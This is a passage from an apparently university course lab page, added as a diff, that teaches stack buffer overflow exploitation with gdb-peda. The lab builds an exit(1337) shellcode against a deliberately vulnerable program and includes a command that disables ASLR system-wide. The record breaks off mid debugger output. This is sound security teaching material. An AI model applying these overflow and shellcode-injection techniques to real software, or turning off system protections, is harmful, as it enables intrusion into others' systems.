@@ -1,0 +1,789 @@
+    
+    
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+ "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"
+ lang="en" dir="ltr">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <title>
+    Lab 06 - Exploiting. Shellcodes    [CS Open CourseWare]
+  </title>
+
+  <meta name="generator" content="DokuWiki"/>
+<meta name="robots" content="index,follow"/>
+<meta name="date" content="2016-11-13T21:36:05+0200"/>
+<meta name="keywords" content="cns,labs,lab-06"/>
+<link rel="search" type="application/opensearchdescription+xml" href="../../lib/exe/opensearch.php" title="CS Open CourseWare"/>
+<link rel="start" href="../../../courses.1.html"/>
+<link rel="alternate" type="application/rss+xml" title="Recent Changes" href="../../feed.php"/>
+<link rel="alternate" type="application/rss+xml" title="Current Namespace" href="../../feed.php%3Fmode=list&amp;ns=cns:labs"/>
+<link rel="alternate" type="text/html" title="Plain HTML" href="../../_export/xhtml/cns/labs/lab-06.html"/>
+<link rel="canonical" href="lab-06.html"/>
+<link rel="stylesheet" type="text/css" href="../../lib/exe/css.php%3Ft=arctic&amp;tseed=1476798676.css"/>
+<script type="text/javascript">/*<![CDATA[*/var NS='cns:labs';var JSINFO = {"id":"cns:labs:lab-06","namespace":"cns:labs","isadmin":0,"isauth":0};
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="../../lib/exe/js.php%3Ftseed=1476798676"></script>
+<script type="text/x-mathjax-config">/*<![CDATA[*/MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+        displayMath: [ ["$$","$$"], ["\\[","\\]"] ],
+        processEscapes: true
+    }
+});
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML"></script>
+<script type="text/javascript">/*<![CDATA[*/
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+		  
+/*!]]>*/</script>
+<script type="text/javascript">/*<![CDATA[*/
+var pageTracker = _gat._getTracker("UA-38383934-1");
+pageTracker._initData();
+pageTracker._trackPageview();
+		  
+/*!]]>*/</script>
+
+  <link rel="shortcut icon" href="../../lib/tpl/arctic/images/favicon.ico" />
+
+  
+</head>
+<body>
+<div id="wrapper" class='show'>
+  <div class="dokuwiki">
+
+    
+    <div class="stylehead">
+      <div class="header">
+        <div class="pagename">
+          <a href="http://ocw.cs.pub.ro/courses/cns/"><img height="70" src="../../res/sigla_cns.png"/> </a>        </div>
+        <div class="logo">
+          <a style="color: #AAA !important;" href="../../systems/index.html"/><img height="70" src="../../res/systems.png" name="dokuwiki__top"/></a>        </div>
+      </div>
+    
+       
+      <div class="breadcrumbs">
+              </div>
+      
+            </div>
+
+                  <div class="bar" id="bar__top">
+        <div class="bar-left">
+                  </div>
+        <div class="bar-right">
+          <a href="lab-06%3Fdo=recent.html"  class="action recent" accesskey="r" rel="nofollow" title="Recent changes [R]">Recent changes</a><a href="lab-06%3Fdo=login&amp;sectok=f62420cf5b01253da4b50505d148181b.html"  class="action login" rel="nofollow" title="Login">Login</a>        </div>
+    </div>
+        
+    
+    
+    
+              <div class="left_page">
+          
+<h1 class="sectionedit1" id="lab_06_-_exploiting_shellcodes">Lab 06 - Exploiting. Shellcodes</h1>
+<div class="level1">
+
+</div>
+
+<h2 class="sectionedit2" id="resources">Resources</h2>
+<div class="level2">
+<ul>
+<li class="level1"><div class="li"> <a href="http://shell-storm.org/shellcode/" class="urlextern" title="http://shell-storm.org/shellcode/"  rel="nofollow">Shellstorm - A collection of shellcodes</a></div>
+</li>
+<li class="level1"><div class="li"> <a href="https://trailofbits.github.io/ctf/exploits/README.html" class="urlextern" title="https://trailofbits.github.io/ctf/exploits/README.html"  rel="nofollow">TrailofBits guide to exploiting binaries</a></div>
+</li>
+<li class="level1"><div class="li"> <a href="http://security.cs.pub.ro/hexcellents/wiki/" class="urlextern" title="http://security.cs.pub.ro/hexcellents/wiki/"  rel="nofollow">Hexcellents - A collection of binary exploitation resources</a></div>
+</li>
+</ul>
+
+</div>
+
+<h2 class="sectionedit3" id="lab_support_files">Lab Support Files</h2>
+<div class="level2">
+
+<p>
+We will use this <a href="http://elf.cs.pub.ro/oss/res/labs/lab-06.tar.gz" class="urlextern" title="http://elf.cs.pub.ro/oss/res/labs/lab-06.tar.gz"  rel="nofollow">lab archive</a> throughout the lab.
+</p>
+
+<p>
+Please download the lab archive an then unpack it using the commands below:
+</p>
+<pre class="code bash"><span class="co4">student@mjolnir:~$ </span><span class="kw2">wget</span> http:<span class="sy0">//</span>elf.cs.pub.ro<span class="sy0">/</span>oss<span class="sy0">/</span>res<span class="sy0">/</span>labs<span class="sy0">/</span>lab-06.tar.gz
+<span class="co4">student@mjolnir:~$ </span><span class="kw2">tar</span> xzf lab-06.tar.gz</pre>
+
+<p>
+After unpacking we will get the <code>lab-06/</code> folder that we will use for the lab:
+</p>
+<pre class="code bash"><span class="co4">student@mjolnir:~$ </span><span class="kw3">cd</span> lab-06<span class="sy0">/</span>
+student<span class="sy0">@</span>mjolnir:~<span class="sy0">/</span>lab-06$ <span class="kw2">ls</span>
+bin_to_hex.sh  Makefile  shellcode_exit.S  skel_pwn.py  test_shellcode.c  vuln2.asm  vuln.asm</pre>
+
+</div>
+
+<h2 class="sectionedit4" id="intro">Intro</h2>
+<div class="level2">
+
+<p>
+Whenever an attacker manages to overwrite the return address, his primary follow-up is to divert the execution flow to his advantage. One can gain a stable foothold inside the exploited system via spawning a shell from the vulnerable application.
+</p>
+
+<p>
+This can be accomplished by injecting code into the application&#039;s memory (stack, heap or by other means) and diverting the execution flow to that code. Please note the following prerequisites in order for this to work:
+</p>
+<ol>
+<li class="level1"><div class="li"> A vulnerability has to exist. If there is a bug which crashes the application, but cannot be leveraged in any way, then that particular attack path is cut short.</div>
+</li>
+<li class="level1"><div class="li"> The attacker must be able to write the desired code inside the program&#039;s memory. This area of memory, apart from being writable, should also be executable, which is extremely rare in today&#039;s binaries.</div>
+</li>
+<li class="level1"><div class="li"> Finally, the injected code should be reached somehow by diverting the execution of the binary towards it.</div>
+</li>
+</ol>
+
+<p>
+Since the injected code&#039;s outcome is commonly that of spawning a shell, the name “shellcode” is used to describe a wide array of such code snippets. A “shellcode” could also create a new socket, or read the contents of a file and print it to the standard output.
+</p>
+
+<p>
+<p><div class="noteimportant">
+For this lab, you need to disable ASLR by issuing the following command:
+</p>
+<pre class="code bash"><span class="kw3">echo</span> <span class="nu0">0</span> <span class="sy0">|</span> <span class="kw2">sudo</span> <span class="kw2">tee</span> <span class="sy0">/</span>proc<span class="sy0">/</span>sys<span class="sy0">/</span>kernel<span class="sy0">/</span>randomize_va_space</pre>
+
+<p>
+
+</div></p>
+</p>
+
+</div>
+
+<h2 class="sectionedit5" id="tutorial_2p">Tutorial [2p]</h2>
+<div class="level2">
+
+<p>
+Let&#039;s write a simple shellcode which performs
+</p>
+<pre class="code C"><a href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span class="kw3">exit</span></a><span class="br0">&#40;</span><span class="nu0">1337</span><span class="br0">&#41;</span><span class="sy0">;</span></pre>
+
+</div>
+
+<h3 class="sectionedit6" id="phase_1recon">Phase 1: Recon</h3>
+<div class="level3">
+
+<p>
+We have the following blatantly vulnerable program:
+</p>
+<pre class="code asm"><span class="kw5">extern</span> gets
+<span class="kw5">extern</span> printf
+&nbsp;
+<span class="kw5">section</span> <span class="kw5">.data</span>
+formatstr<span class="sy1">:</span> <span class="kw5">db</span> <span class="st0">&quot;Enjoy your leak: %p&quot;</span><span class="sy1">,</span><span class="nu0">0xa</span><span class="sy1">,</span><span class="nu0">0</span>
+&nbsp;
+<span class="kw5">section</span> <span class="kw5">.text</span>
+<span class="kw5">global</span> main
+main<span class="sy1">:</span>
+	<span class="kw1">push</span> <span class="kw4">ebp</span>
+	<span class="kw1">mov</span> <span class="kw4">ebp</span><span class="sy1">,</span> <span class="kw4">esp</span>
+	<span class="kw1">sub</span> <span class="kw4">esp</span><span class="sy1">,</span> <span class="nu0">64</span>
+	<span class="kw1">lea</span> <span class="kw4">ebx</span><span class="sy1">,</span> <span class="br0">&#91;</span><span class="kw4">ebp</span> <span class="sy1">-</span> <span class="nu0">64</span><span class="br0">&#93;</span>
+	<span class="kw1">push</span> <span class="kw4">ebx</span>
+	<span class="kw1">push</span> formatstr
+	<span class="kw1">call</span> printf
+	<span class="kw1">push</span> <span class="kw4">ebx</span>
+	<span class="kw1">call</span> gets
+	<span class="kw1">add</span> <span class="kw4">esp</span><span class="sy1">,</span> <span class="nu0">4</span>
+	<span class="kw1">leave</span>
+	<span class="kw1">ret</span></pre>
+
+<p>
+You may already see what the vulnerability consists of.
+</p>
+
+</div>
+
+<h3 class="sectionedit7" id="phase_2finding_the_vulnerability">Phase 2: Finding the vulnerability</h3>
+<div class="level3">
+
+<p>
+We are going to use some of PEDA&#039;s features to our advantage:
+</p>
+<pre class="code asm">gdb<span class="sy1">-</span>peda<span class="sy2">$</span> pattc <span class="nu0">100</span> # Generate a De Bruijn pattern of length <span class="nu0">100</span>
+<span class="st0">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span>
+gdb<span class="sy1">-</span>peda<span class="sy2">$</span> r
+Starting program<span class="sy1">:</span> <span class="sy1">/</span>vuln 
+AAA<span class="sy1">%</span>AAsAABAA<span class="sy2">$</span>AAnAACAA<span class="sy1">-</span>AA<span class="br0">&#40;</span>AADAA<span class="co1">;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</span>
+&nbsp;
+Program received signal SIGSEGV<span class="sy1">,</span> Segmentation fault<span class="sy1">.</span>
+&nbsp;
+ <span class="br0">&#91;</span><span class="sy1">----------------------------------</span>registers<span class="sy1">-----------------------------------</span><span class="br0">&#93;</span>
+<span class="kw4">EAX</span><span class="sy1">:</span> <span class="nu0">0xfff088f8</span> <span class="br0">&#40;</span><span class="st0">&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="kw4">EBX</span><span class="sy1">:</span> <span class="nu0">0xfff088f8</span> <span class="br0">&#40;</span><span class="st0">&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="kw4">ECX</span><span class="sy1">:</span> <span class="nu0">0xf77495a0</span> <span class="sy1">--</span>&gt; <span class="nu0">0xfbad2288</span> 
+<span class="kw4">EDX</span><span class="sy1">:</span> <span class="nu0">0xf774a87c</span> <span class="sy1">--</span>&gt; <span class="nu0">0x0</span> 
+<span class="kw4">ESI</span><span class="sy1">:</span> <span class="nu0">0xf7749000</span> <span class="sy1">--</span>&gt; <span class="nu0">0x1aedb0</span> 
+<span class="kw4">EDI</span><span class="sy1">:</span> <span class="nu0">0xf7749000</span> <span class="sy1">--</span>&gt; <span class="nu0">0x1aedb0</span> 
+<span class="kw4">EBP</span><span class="sy1">:</span> <span class="nu0">0x41644141</span> <span class="br0">&#40;</span><span class="st0">'AAdA'</span><span class="br0">&#41;</span>
+<span class="kw4">ESP</span><span class="sy1">:</span> <span class="nu0">0xfff08940</span> <span class="br0">&#40;</span><span class="st0">&quot;IAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+EIP<span class="sy1">:</span> <span class="nu0">0x41413341</span> <span class="br0">&#40;</span><span class="st0">'A3AA'</span><span class="br0">&#41;</span>
+EFLAGS<span class="sy1">:</span> <span class="nu0">0x10282</span> <span class="br0">&#40;</span>carry parity adjust zero SIGN trap INTERRUPT direction overflow<span class="br0">&#41;</span>
+<span class="br0">&#91;</span><span class="sy1">-------------------------------------</span><span class="kw5">code</span><span class="sy1">-------------------------------------</span><span class="br0">&#93;</span>
+Invalid <span class="sy2">$</span>PC address<span class="sy1">:</span> <span class="nu0">0x41413341</span>
+<span class="br0">&#91;</span><span class="sy1">------------------------------------</span><span class="kw5">stack</span><span class="sy1">-------------------------------------</span><span class="br0">&#93;</span>
+<span class="co2">0000</span>| <span class="nu0">0xfff08940</span> <span class="br0">&#40;</span><span class="st0">&quot;IAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0004</span>| <span class="nu0">0xfff08944</span> <span class="br0">&#40;</span><span class="st0">&quot;AA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0008</span>| <span class="nu0">0xfff08948</span> <span class="br0">&#40;</span><span class="st0">&quot;AJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0012</span>| <span class="nu0">0xfff0894c</span> <span class="br0">&#40;</span><span class="st0">&quot;fAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0016</span>| <span class="nu0">0xfff08950</span> <span class="br0">&#40;</span><span class="st0">&quot;AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0020</span>| <span class="nu0">0xfff08954</span> <span class="br0">&#40;</span><span class="st0">&quot;AgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0024</span>| <span class="nu0">0xfff08958</span> <span class="br0">&#40;</span><span class="st0">&quot;6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0028</span>| <span class="nu0">0xfff0895c</span> <span class="sy1">--</span>&gt; <span class="nu0">0xf779ac00</span> <span class="sy1">--</span>&gt; <span class="nu0">0x1</span> 
+<span class="br0">&#91;</span><span class="sy1">------------------------------------------------------------------------------</span><span class="br0">&#93;</span>
+Legend<span class="sy1">:</span> <span class="kw5">code</span><span class="sy1">,</span> <span class="kw5">data</span><span class="sy1">,</span> rodata<span class="sy1">,</span> value
+Stopped reason<span class="sy1">:</span> SIGSEGV
+<span class="nu0">0x41413341</span> <span class="kw1">in</span> ?? <span class="br0">&#40;</span><span class="br0">&#41;</span>
+gdb<span class="sy1">-</span>peda<span class="sy2">$</span> patto A3AA # Find offset within pattern
+<span class="co2">A3AA</span> found <span class="kw5">at</span> offset<span class="sy1">:</span> <span class="nu0">68</span></pre>
+
+<p>
+Notice that the program crashed. We can quickly determine that the program tried to return to <strong>0x41413341</strong>, which is in an unmapped region of memory, and thus triggered a fault. This value corresponds to the unique quad group “A3AA” found at offset 68 in the pattern. This offset is where the return address is situated relative to our input.
+</p>
+
+</div>
+
+<h3 class="sectionedit8" id="phase_3reliable_crash">Phase 3: Reliable crash</h3>
+<div class="level3">
+
+<p>
+Now that we know the offset from the beginning of the buffer (and also, our input) as being 68, we can attempt to reliably crash the program to a destination of our choice. Let&#039;s try having <strong>&#039;BBBB&#039;</strong> as our return address, or <strong>0x42424242</strong>, preceded by 68 &#039;A&#039;s.
+</p>
+
+<p>
+We can construct this test sequence using python from the command line:
+</p>
+<pre class="code bash">python <span class="re5">-c</span> <span class="st0">&quot;print 'A'*68 + 'BBBB'&quot;</span></pre>
+
+<p>
+We can now rerun the binary under gdb and see what happens.
+</p>
+<pre class="code asm">gdb<span class="sy1">-</span>peda<span class="sy2">$</span> r
+Starting program<span class="sy1">:</span> <span class="sy1">/</span>vuln 
+<span class="co2">AAAAAAAA</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+&nbsp;
+Program received signal SIGSEGV<span class="sy1">,</span> Segmentation fault<span class="sy1">.</span>
+&nbsp;
+ <span class="br0">&#91;</span><span class="sy1">----------------------------------</span>registers<span class="sy1">-----------------------------------</span><span class="br0">&#93;</span>
+<span class="kw4">EAX</span><span class="sy1">:</span> <span class="nu0">0xffb0e678</span> <span class="br0">&#40;</span><span class="st0">'A'</span> &lt;repeats <span class="nu0">68</span> <span class="kw5">times</span>&gt;<span class="sy1">,</span> <span class="st0">&quot;BBBB&quot;</span><span class="br0">&#41;</span>
+<span class="kw4">EBX</span><span class="sy1">:</span> <span class="nu0">0xffb0e678</span> <span class="br0">&#40;</span><span class="st0">'A'</span> &lt;repeats <span class="nu0">68</span> <span class="kw5">times</span>&gt;<span class="sy1">,</span> <span class="st0">&quot;BBBB&quot;</span><span class="br0">&#41;</span>
+<span class="kw4">ECX</span><span class="sy1">:</span> <span class="nu0">0xf77905a0</span> <span class="sy1">--</span>&gt; <span class="nu0">0xfbad2288</span> 
+<span class="kw4">EDX</span><span class="sy1">:</span> <span class="nu0">0xf779187c</span> <span class="sy1">--</span>&gt; <span class="nu0">0x0</span> 
+<span class="kw4">ESI</span><span class="sy1">:</span> <span class="nu0">0xf7790000</span> <span class="sy1">--</span>&gt; <span class="nu0">0x1aedb0</span> 
+<span class="kw4">EDI</span><span class="sy1">:</span> <span class="nu0">0xf7790000</span> <span class="sy1">--</span>&gt; <span class="nu0">0x1aedb0</span> 
+<span class="kw4">EBP</span><span class="sy1">:</span> <span class="nu0">0x41414141</span> <span class="br0">&#40;</span><span class="st0">'AAAA'</span><span class="br0">&#41;</span>
+<span class="kw4">ESP</span><span class="sy1">:</span> <span class="nu0">0xffb0e6c0</span> <span class="sy1">--</span>&gt; <span class="nu0">0x0</span> 
+EIP<span class="sy1">:</span> <span class="nu0">0x42424242</span> <span class="br0">&#40;</span><span class="st0">'BBBB'</span><span class="br0">&#41;</span>
+EFLAGS<span class="sy1">:</span> <span class="nu0">0x10286</span> <span class="br0">&#40;</span>carry PARITY adjust zero SIGN trap INTERRUPT direction overflow<span class="br0">&#41;</span>
+<span class="br0">&#91;</span><span class="sy1">-------------------------------------</span><span class="kw5">code</span><span class="sy1">-------------------------------------</span><span class="br0">&#93;</span>
+Invalid <span class="sy2">$</span>PC address<span class="sy1">:</span> <span class="nu0">0x42424242</span>
+<span class="br0">&#91;</span><span class="sy1">------------------------------------</span><span class="kw5">stack</span><span class="sy1">-------------------------------------</span><span class="br0">&#93;</span>
+<span class="co2">0000</span>| <span class="nu0">0xffb0e6c0</span> <span class="sy1">--</span>&gt; <span class="nu0">0x0</span> 
+<span class="co2">0004</span>| <span class="nu0">0xffb0e6c4</span> <span class="sy1">--</span>&gt; <span class="nu0">0xffb0e754</span> <span class="sy1">--</span>&gt; <span class="nu0">0xffb1018e</span> <span class="br0">&#40;</span><span class="st0">&quot;/vuln&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0008</span>| <span class="nu0">0xffb0e6c8</span> <span class="sy1">--</span>&gt; <span class="nu0">0xffb0e75c</span> <span class="sy1">--</span>&gt; <span class="nu0">0xffb101c0</span> <span class="br0">&#40;</span><span class="st0">&quot;LC_PAPER=ro_RO.UTF-8&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0012</span>| <span class="nu0">0xffb0e6cc</span> <span class="sy1">--</span>&gt; <span class="nu0">0x0</span> 
+<span class="co2">0016</span>| <span class="nu0">0xffb0e6d0</span> <span class="sy1">--</span>&gt; <span class="nu0">0x0</span> 
+<span class="co2">0020</span>| <span class="nu0">0xffb0e6d4</span> <span class="sy1">--</span>&gt; <span class="nu0">0x0</span> 
+<span class="co2">0024</span>| <span class="nu0">0xffb0e6d8</span> <span class="sy1">--</span>&gt; <span class="nu0">0xf7790000</span> <span class="sy1">--</span>&gt; <span class="nu0">0x1aedb0</span> 
+<span class="co2">0028</span>| <span class="nu0">0xffb0e6dc</span> <span class="sy1">--</span>&gt; <span class="nu0">0xf77e1c04</span> <span class="sy1">--</span>&gt; <span class="nu0">0x0</span> 
+<span class="br0">&#91;</span><span class="sy1">------------------------------------------------------------------------------</span><span class="br0">&#93;</span>
+Legend<span class="sy1">:</span> <span class="kw5">code</span><span class="sy1">,</span> <span class="kw5">data</span><span class="sy1">,</span> rodata<span class="sy1">,</span> value
+Stopped reason<span class="sy1">:</span> SIGSEGV
+<span class="nu0">0x42424242</span> <span class="kw1">in</span> ?? <span class="br0">&#40;</span><span class="br0">&#41;</span></pre>
+
+<p>
+Excellent!
+</p>
+
+</div>
+
+<h3 class="sectionedit9" id="phase_4writing_the_shellcode">Phase 4: Writing the shellcode</h3>
+<div class="level3">
+
+<p>
+Shellcode is typically written in assembly, due to memory constraints.
+</p>
+
+<p>
+How do we start writing our <em>exit</em> shellcode? First, we need to know how system calls are performed on our target platform (x86 in our case).
+</p>
+
+<p>
+Each system call has a specific number which identifies it. This number must be stored in EAX. Next, the arguments of the system call are placed in EBX, ECX, EDX, ESI, EDI, in this order. A special software interrupt is used to issue the actual system call, <strong>int 0x80</strong>.
+</p>
+
+<p>
+Consult the Linux x32 ABI <a href="http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/linux_abi_x32" class="urlextern" title="http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/linux_abi_x32"  rel="nofollow">here</a>
+</p>
+
+<p>
+We need to place <strong>1</strong> (exit&#039;s system call number) in EAX, and the value of exit&#039;s single argument in EBX.
+</p>
+
+<p>
+Our shellcode will look as follows:
+</p>
+<pre class="code asm"><span class="kw5">BITS</span> <span class="nu0">32</span>
+<span class="kw1">mov</span> <span class="kw4">eax</span><span class="sy1">,</span> <span class="nu0">1</span>
+<span class="kw1">mov</span> <span class="kw4">ebx</span><span class="sy1">,</span> <span class="nu0">1337</span>
+<span class="kw1">int</span> <span class="nu0">0x80</span></pre>
+
+<p>
+But we can&#039;t pass it as assembly instructions to the application; we need to assemble it into binary as well.
+</p>
+<pre class="code bash"><span class="kw2">nasm</span> shellcode_exit.S <span class="re5">-o</span> shell.bin</pre>
+
+<p>
+We now need this binary code as a stream of hex values in order to use python/perl/echo to feed it into the application.
+</p>
+<pre class="code bash"><span class="kw2">hexdump</span> <span class="re5">-v</span> <span class="re5">-e</span> <span class="st_h">'1/1 &quot;\\&quot;'</span> <span class="re5">-e</span> <span class="st_h">'1/1 &quot;x%02x&quot;'</span> shell.bin ; <span class="kw3">echo</span></pre>
+
+<p>
+or
+</p>
+<pre class="code bash">xxd <span class="re5">-c</span> <span class="nu0">1</span> <span class="re5">-p</span> shell.bin <span class="sy0">|</span> <span class="kw2">awk</span> <span class="st_h">'{ print &quot;\\x&quot; $0 }'</span> <span class="sy0">|</span> paste <span class="re5">-sd</span> <span class="st0">&quot;&quot;</span></pre>
+
+<p>
+or just use the conveniently supplied <strong>bin_to_hex.sh</strong> script.
+</p>
+
+<p>
+In order to test your shellcode, you can use <strong>xxd</strong> to export the shellcode as a C array and test it using the <strong>test_shellcode</strong> program in the archive.
+</p>
+<pre class="code bash">xxd <span class="re5">-i</span> shell.bin <span class="sy0">&gt;</span> shellcode</pre>
+
+<p>
+By running <strong>test_shellcode</strong> under <strong>strace</strong>, you can check to see exactly if the system call was performed, and with which arguments. If all else fails, <strong>gdb</strong>.
+</p>
+<pre class="code bash"><span class="kw2">strace</span> <span class="re5">-e</span> <span class="kw3">exit</span> .<span class="sy0">/</span>test_shellcode 
+strace: <span class="br0">&#91;</span> Process <span class="re2">PID</span>=<span class="nu0">5155</span> runs <span class="kw1">in</span> <span class="nu0">32</span> bit mode. <span class="br0">&#93;</span>
+<span class="kw3">exit</span><span class="br0">&#40;</span><span class="nu0">1337</span><span class="br0">&#41;</span>                              = ?
++++ exited with <span class="nu0">57</span> +++</pre>
+
+</div>
+
+<h3 class="sectionedit10" id="phase_5placing_the_shellcode">Phase 5: Placing the shellcode</h3>
+<div class="level3">
+
+<p>
+Use the supplied <strong>bin_to_hex.sh</strong> script to convert a binary file to a hex representation. You can also do one final view of the shellcode using <strong>objdump</strong>:
+</p>
+<pre class="code asm">objdump <span class="sy1">-</span>D <span class="sy1">-</span>b binary <span class="sy1">-</span>M intel <span class="sy1">-</span>m i386 shell<span class="sy1">.</span>bin
+shell<span class="sy1">.</span>bin<span class="sy1">:</span>     file format binary
+&nbsp;
+&nbsp;
+Disassembly of <span class="kw5">section</span> <span class="kw5">.data</span><span class="sy1">:</span>
+&nbsp;
+<span class="co2">00000000</span> &lt;<span class="kw5">.data</span>&gt;<span class="sy1">:</span>
+   <span class="nu0">0</span><span class="sy1">:</span>	b8 <span class="nu0">01</span> <span class="nu0">00</span> <span class="nu0">00</span> <span class="nu0">00</span>       	<span class="kw1">mov</span>    <span class="kw4">eax</span><span class="sy1">,</span><span class="nu0">0x1</span>
+   <span class="nu0">5</span><span class="sy1">:</span>	bb <span class="nu0">39</span> <span class="nu0">05</span> <span class="nu0">00</span> <span class="nu0">00</span>       	<span class="kw1">mov</span>    <span class="kw4">ebx</span><span class="sy1">,</span><span class="nu0">0x539</span>
+   a<span class="sy1">:</span>	cd <span class="nu0">80</span>                	<span class="kw1">int</span>    <span class="nu0">0x80</span></pre>
+
+<p>
+First, let&#039;s determine the length of our shellcode:
+</p>
+<pre class="code bash">python <span class="re5">-c</span> <span class="st0">&quot;print len('<span class="es4">$(./bin_to_hex.sh shell.bin)</span>')&quot;</span>
+<span class="nu0">12</span></pre>
+
+<p>
+Next, we&#039;ll need to fill our buffer up to 68 characters until the saved return address is reached on the stack.
+</p>
+<pre class="code bash">python <span class="re5">-c</span> <span class="st0">&quot;print '<span class="es4">$(./bin_to_hex.sh shell.bin)</span>' + 'A'*(68-12)&quot;</span></pre>
+
+</div>
+
+<h3 class="sectionedit11" id="phase_6diverting_control_flow">Phase 6: Diverting control flow</h3>
+<div class="level3">
+
+<p>
+Now we need to find the beginning of our buffer on the stack in order to return to it. Repeat the experiment and set a breakpoint at the <strong>leave</strong> instruction. Write down the address of the beginning of your buffer on the stack, cause that&#039;s where the shellcode will end up.
+</p>
+<pre class="code asm">gdb<span class="sy1">-</span>peda<span class="sy2">$</span> b <span class="sy1">*</span><span class="nu0">0x8048422</span>
+Breakpoint <span class="nu0">1</span> <span class="kw5">at</span> <span class="nu0">0x8048422</span>
+gdb<span class="sy1">-</span>peda<span class="sy2">$</span> r
+Starting program<span class="sy1">:</span> <span class="sy1">/</span>vuln 
+AAA<span class="sy1">%</span>AAsAABAA<span class="sy2">$</span>AAnAACAA<span class="sy1">-</span>AA<span class="br0">&#40;</span>AADAA<span class="co1">;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</span>
+&nbsp;
+ <span class="br0">&#91;</span><span class="sy1">----------------------------------</span>registers<span class="sy1">-----------------------------------</span><span class="br0">&#93;</span>
+<span class="kw4">EAX</span><span class="sy1">:</span> <span class="nu0">0xffffceb8</span> <span class="br0">&#40;</span><span class="st0">&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="kw4">EBX</span><span class="sy1">:</span> <span class="nu0">0xffffceb8</span> <span class="br0">&#40;</span><span class="st0">&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="kw4">ECX</span><span class="sy1">:</span> <span class="nu0">0xf7fac5a0</span> <span class="sy1">--</span>&gt; <span class="nu0">0xfbad2288</span> 
+<span class="kw4">EDX</span><span class="sy1">:</span> <span class="nu0">0xf7fad87c</span> <span class="sy1">--</span>&gt; <span class="nu0">0x0</span> 
+<span class="kw4">ESI</span><span class="sy1">:</span> <span class="nu0">0xf7fac000</span> <span class="sy1">--</span>&gt; <span class="nu0">0x1aedb0</span> 
+<span class="kw4">EDI</span><span class="sy1">:</span> <span class="nu0">0xf7fac000</span> <span class="sy1">--</span>&gt; <span class="nu0">0x1aedb0</span> 
+<span class="kw4">EBP</span><span class="sy1">:</span> <span class="nu0">0xffffcef8</span> <span class="br0">&#40;</span><span class="st0">&quot;AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="kw4">ESP</span><span class="sy1">:</span> <span class="nu0">0xffffceb8</span> <span class="br0">&#40;</span><span class="st0">&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+EIP<span class="sy1">:</span> <span class="nu0">0x8048422</span> <span class="br0">&#40;</span>&lt;main<span class="sy1">+</span><span class="nu0">18</span>&gt;<span class="sy1">:</span>	<span class="kw1">leave</span><span class="br0">&#41;</span>
+EFLAGS<span class="sy1">:</span> <span class="nu0">0x286</span> <span class="br0">&#40;</span>carry PARITY adjust zero SIGN trap INTERRUPT direction overflow<span class="br0">&#41;</span>
+<span class="br0">&#91;</span><span class="sy1">-------------------------------------</span><span class="kw5">code</span><span class="sy1">-------------------------------------</span><span class="br0">&#93;</span>
+   <span class="nu0">0x8048419</span> &lt;main<span class="sy1">+</span><span class="nu0">9</span>&gt;<span class="sy1">:</span>	<span class="kw1">push</span>   <span class="kw4">ebx</span>
